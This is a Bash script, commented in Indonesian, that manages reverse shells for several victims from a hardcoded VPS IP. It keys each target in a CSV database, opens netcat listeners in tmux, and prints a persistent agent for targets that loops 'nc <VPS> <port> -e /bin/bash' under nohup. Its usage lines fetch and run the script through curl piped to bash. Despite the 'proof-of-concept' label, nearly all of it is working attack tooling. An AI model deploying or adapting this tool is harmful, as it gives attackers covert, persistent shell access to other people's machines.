#!/usr/bin/env bash
#
# =========================================================
#  MULTI-USER REVERSE SHELL MANAGER (Proof-of-Concept)
#  Database disimpan di direktori yang sama dengan script.sh
# =========================================================
#  Modes:
#   1) INSTALL : X="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   2) CONNECT : S="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   3) LIST    : LIST=1 bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   4) KILL    : K="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
# =========================================================

# ----------------------------
# 1) Menentukan Path Database
# ----------------------------
#  - Temukan direktori tempat script ini berada,
#  - Lalu simpan DB di situ agar tidak tergantung /tmp.
#  - readlink -f berguna untuk dapat absolute path.

SCRIPT_PATH="$(readlink -f "$0")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
DB_FILE="${SCRIPT_DIR}/multi_reverse_db.csv"

# ----------------------------
# 2) Konfigurasi Lain
# ----------------------------
VPS_IP="45.76.182.111"    # Ganti dengan IP/domain VPS Anda
PORT_MIN=30000
PORT_MAX=40000

# Pastikan tool yang diperlukan terinstall di VPS:
#  - netcat (nc) versi "tradisional" (mendukung -e) atau ncat
#  - tmux
#  - (opsional) date, grep, awk, sed

# ----------------------------
# 3) Fungsi Pembantu
# ----------------------------

generate_port() {
  # Generate port random di rentang [PORT_MIN, PORT_MAX]
  shuf -i ${PORT_MIN}-${PORT_MAX} -n 1
}

timestamp_now() {
  # Format timestamp, misalnya "2025-02-03 10:15:30"
  date "+%Y-%m-%d %H:%M:%S"
}

init_db() {
  # Buat file DB jika belum ada
  if [ ! -f "$DB_FILE" ]; then
    touch "$DB_FILE"
  fi
}

save_record() {
  # Param: $1=key, $2=targetIP, $3=port, $4=status, $5=pid
  # Format CSV: key, IP, port, status, pid, createdAt
  local createdAt
  createdAt="$(timestamp_now)"
  echo "$1,$2,$3,$4,$5,$createdAt" >> "$DB_FILE"
}

update_record() {
  # Param: $1=key, $2=fieldIndex, $3=newValue
  # Field index (1=key, 2=IP, 3=port, 4=status, 5=pid, 6=createdAt)
  local key="$1"
  local fieldIndex="$2"
  local newValue="$3"

  if [ ! -f "$DB_FILE" ]; then
    echo "[ERROR] DB file not found ($DB_FILE)."
    return 1
  fi

  # Escape special chars
  local escapedKey
  escapedKey="$(echo "$key" | sed 's/[]\/$*.^|[]/\\&/g')"
  local escapedValue
  escapedValue="$(echo "$newValue" | sed 's/[]\/$*.^|[]/\\&/g')"

  # Gunakan awk untuk update kolom CSV
  awk -F, -v k="$key" -v f="$fieldIndex" -v val="$escapedValue" 'BEGIN {OFS=","} {
    if ($1 == k) {
      $f = val
    }
    print $0
  }' "$DB_FILE" > "${DB_FILE}.tmp" && mv "${DB_FILE}.tmp" "$DB_FILE"
}

find_record_by_key() {
  local key="$1"
  if [ ! -f "$DB_FILE" ]; then
    return
  fi
  grep "^${key}," "$DB_FILE" | tail -n 1
}

get_field() {
  local record="$1"
  local index="$2"
  echo "$record" | cut -d',' -f "$index"
}

tmux_session_exists() {
  local sessionName="$1"
  tmux ls 2>/dev/null | grep -q "^${sessionName}:"
}

# ----------------------------
# 4) Mode: INSTALL
# ----------------------------
mode_install() {
  local key="$1"
  echo "[INFO] === MODE INSTALL: Key=$key ==="

  # 4a. Dapatkan IP publik/target
  local targetIP
  targetIP="$(curl -s ifconfig.me || echo "UNKNOWN_IP")"

  # 4b. Inisialisasi DB & Cek jika key sudah ada
  init_db
  local existing
  existing="$(find_record_by_key "$key")"
  if [ -n "$existing" ]; then
    echo "[WARN] Key '$key' sudah ada di database. Akan overwrite / gunakan data lama."
  fi

  # 4c. Generate port untuk key ini
  local assignedPort
  assignedPort="$(generate_port)"

  # 4d. Simpan data: key, IP, port, status=STOPPED, pid=-
  if [ -n "$existing" ]; then
    update_record "$key" 2 "$targetIP"
    update_record "$key" 3 "$assignedPort"
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
  else
    save_record "$key" "$targetIP" "$assignedPort" "STOPPED" "-"
  fi

  # 4e. Tampilkan info
  cat <<EOF
[INFO] Berhasil mendaftarkan Key='$key' dengan IP='$targetIP'.
[INFO] Port assigned = $assignedPort

=== PETUNJUK AGENT ===
Berikut contoh agen yang dapat Anda jalankan di sisi target (misal: /tmp/agent.sh):

-------------------------------------------------
#!/usr/bin/env bash

while true; do
  # Tunggu 10 detik sebelum mencoba konek
  sleep 10
  nc ${VPS_IP} ${assignedPort} -e /bin/bash
done
-------------------------------------------------

1. Simpan skrip di /tmp/agent.sh
2. chmod +x /tmp/agent.sh
3. Jalankan: nohup /tmp/agent.sh &

Setiap kali VPS buka listener (CONNECT Mode) untuk Key=$key,
agen di target akan menelpon balik ke port ${assignedPort}.
EOF
}

# ----------------------------
# 5) Mode: CONNECT
# ----------------------------
mode_connect() {
  local key="$1"
  echo "[INFO] === MODE CONNECT: Key=$key ==="

  init_db
  local record
  record="$(find_record_by_key "$key")"
  if [ -z "$record" ]; then
    echo "[ERROR] Key '$key' tidak ditemukan di database ($DB_FILE)."
    exit 1
  fi

  local targetIP port status pid
  targetIP="$(get_field "$record" 2)"
  port="$(get_field "$record" 3)"
  status="$(get_field "$record" 4)"
  pid="$(get_field "$record" 5)"

  echo "[INFO] -> targetIP=$targetIP ; assignedPort=$port ; status=$status"

  local sessionName="rs_${key}"
  if tmux_session_exists "$sessionName"; then
    echo "[WARN] Session '$sessionName' sudah berjalan. Mungkin listener sudah aktif."
    echo "       Silakan KILL terlebih dahulu jika ingin restart."
    echo "       Atau attach ke session: tmux attach -t $sessionName"
    exit 0
  fi

  echo "[INFO] Membuka listener (nc) di port $port, session tmux=$sessionName"
  tmux new -d -s "$sessionName" "nc -lvkp $port"

  update_record "$key" 4 "LISTENING"
  update_record "$key" 5 "$sessionName"

  echo "[INFO] Listener aktif. Silakan pastikan agen di target berjalan."
  echo "[INFO] Untuk melihat session netcat: tmux attach -t $sessionName"
  echo "[INFO] Tekan Ctrl+B+D (atau Ctrl+AD) untuk detach kembali."
}

# ----------------------------
# 6) Mode: LIST
# ----------------------------
mode_list() {
  echo "=== DAFTAR KEY DI DATABASE ==="
  init_db

  if [ ! -s "$DB_FILE" ]; then
    echo "[INFO] Belum ada data. (DB kosong) => $DB_FILE"
    exit 0
  fi

  echo "KEY, IP, PORT, STATUS, PID/TMUX_SESSION, CREATED_AT"
  cat "$DB_FILE"
}

# ----------------------------
# 7) Mode: KILL
# ----------------------------
mode_kill() {
  local key="$1"
  echo "[INFO] === MODE KILL: Key=$key ==="

  init_db
  local record
  record="$(find_record_by_key "$key")"
  if [ -z "$record" ]; then
    echo "[ERROR] Key '$key' tidak ditemukan di database ($DB_FILE)."
    exit 1
  fi

  local status pid
  status="$(get_field "$record" 4)"
  pid="$(get_field "$record" 5)"

  if [ "$status" != "LISTENING" ]; then
    echo "[WARN] Status key='$key' bukan LISTENING. status=$status"
    echo "       Mungkin listener sudah mati."
    exit 0
  fi

  local sessionName="$pid"
  if tmux_session_exists "$sessionName"; then
    echo "[INFO] Menutup tmux session '$sessionName' ..."
    tmux kill-session -t "$sessionName" 2>/dev/null
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
    echo "[INFO] Listener untuk key=$key berhasil dimatikan."
  else
    echo "[WARN] Tmux session '$sessionName' tidak ditemukan. Update status ke STOPPED."
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
  fi
}

# ----------------------------
# 8) MAIN
# ----------------------------
main() {
  if [ -n "$X" ]; then
    mode_install "$X"
  elif [ -n "$S" ]; then
    mode_connect "$S"
  elif [ -n "$LIST" ]; then
    mode_list
  elif [ -n "$K" ]; then
    mode_kill "$K"
  else
    cat <<EOF
[Usage]:
  # 1) Install/Daftar Key di Target:
     X="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"
  
  # 2) Jalankan Listener di VPS (CONNECT):
     S="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"
  
  # 3) List semua key & status:
     LIST=1 bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"
  
  # 4) Kill/Matikan listener tertentu:
     K="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"

[INFO] File database disimpan di: $DB_FILE
EOF
  fi
}

main "$@"
